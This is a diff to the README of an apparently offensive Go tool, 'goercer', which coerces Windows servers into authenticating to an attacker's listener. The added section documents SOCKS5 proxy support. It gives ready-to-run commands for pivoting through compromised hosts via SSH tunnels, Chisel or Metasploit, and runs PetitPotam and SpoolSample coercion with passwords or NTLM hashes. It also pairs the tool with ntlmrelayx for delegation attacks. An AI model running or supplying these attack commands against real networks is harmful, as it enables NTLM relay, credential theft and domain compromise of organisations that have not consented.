@@ -44,6 +44,7 @@ Successfully coerces Windows servers to authenticate to an attacker-controlled l
 
 **Key Features**:
 - ✅ **Pass-the-Hash Support** - Authenticate with NTLM hash instead of password
+- ✅ **SOCKS5 Proxy Support** - Route attacks through proxy servers
 - ✅ **4 Coercion Methods** - PetitPotam, SpoolSample, ShadowCoerce, DFSCoerce
 - ✅ **Alternative Named Pipes** - 5 pipe options for PetitPotam (lsarpc, efsr, samr, netlogon, lsass)
 - ✅ **PKT_PRIVACY Encryption** - Full DCERPC authentication with encryption/signing
@@ -124,6 +125,34 @@ While this could be split into multiple files (`auth.go`, `petitpotam.go`, etc.)
 
 The tool automatically detects if you're providing a password or NTLM hash (32 hex characters).
 
+### SOCKS5 Proxy Support
+
+**Validated and working** - The tool correctly routes connections through SOCKS5 proxies for network pivoting.
+
+**Use proxy for pivoting**:
+```bash
+# Setup SOCKS5 proxy (via SSH tunnel or compromised host)
+ssh -D 1080 user@pivot-host
+
+# Route attack through proxy
+./goercer 10.0.0.10 10.0.0.5 john Password123 corp.local --proxy socks5://127.0.0.1:1080
+
+# Works with all methods and authentication modes
+./goercer 10.0.0.10 10.0.0.5 john hash corp.local spoolsample --proxy socks5://127.0.0.1:1080
+./goercer 10.0.0.10 10.0.0.5 john Password123 corp.local petitpotam efsr --proxy socks5://127.0.0.1:1080
+```
+
+**How it works**:
+- Without `--proxy`: Connects directly to target IP
+- With `--proxy`: Connects to proxy server, which then connects to target
+- Verified with `strace`: Shows connection to proxy IP, not target IP
+
+**Common proxy scenarios**:
+- **SSH SOCKS tunnel**: `ssh -D 1080 user@jumpbox`
+- **Metasploit SOCKS proxy**: Use `auxiliary/server/socks_proxy`
+- **Chisel tunnel**: `chisel server -p 8080 --socks5` / `chisel client server:8080 socks`
+- **Proxychains alternative**: Built-in, no external tool needed
+
 ### Help Output
 
 ```
@@ -164,6 +193,9 @@ sudo responder -I eth0 -v
 
 # SpoolSample - HIGH SUCCESS RATE (3 callbacks)
 ./goercer <target> <listener> <user> <pass> <domain> spoolsample
+
+# Use SOCKS5 proxy (pivoting through compromised host)
+./goercer <target> <listener> <user> <pass> <domain> --proxy socks5://127.0.0.1:1080
 
 # ShadowCoerce (only if VSS RPC is available)
 ./goercer <target> <listener> <user> <pass> <domain> shadowcoerce
@@ -693,6 +725,19 @@ A: Yes! Use `ntlmrelayx.py` instead of Responder:
 ntlmrelayx.py -t ldaps://<target> --delegate-access
 ./goercer <source> <attacker_IP> <user> <pass> <domain>
 ```
+
+**Q: Can I use this through a proxy?**  
+A: Yes! Use the `--proxy` flag for SOCKS5 proxies:
+```bash
+# SSH tunnel
+ssh -D 1080 user@pivot
+./goercer <target> <listener> <user> <pass> <domain> --proxy socks5://127.0.0.1:1080
+
+# Chisel
+chisel server -p 8080 --socks5
+./goercer <target> <listener> <user> <pass> <domain> --proxy socks5://127.0.0.1:1080
+```
+This is useful for pivoting through compromised hosts or accessing segmented networks.
 
 **Q: Does this work on Windows 11/Server 2022?**  
 A: Yes! PetitPotam and SpoolSample still work on latest Windows versions. Microsoft's patches focused on unauthenticated coercion; authenticated attacks still function.
